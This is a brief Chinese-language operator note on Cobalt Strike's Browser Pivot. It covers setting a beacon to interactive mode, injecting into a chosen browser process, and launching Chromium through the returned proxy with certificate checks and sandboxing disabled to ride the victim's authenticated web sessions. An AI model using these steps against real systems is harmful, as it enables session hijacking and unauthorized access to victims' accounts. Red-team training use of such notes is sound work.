	beacon 设为交互模式
	beacon> sleep 0
	[Beacon] → Explore → Browser Pivot
	选择打对勾的注入，会返回一个proxy，服务器IP+端口
	>chromium --no-sandbox --ignore-certificate-errors --proxy-server=服务器IP:端口
	访问网址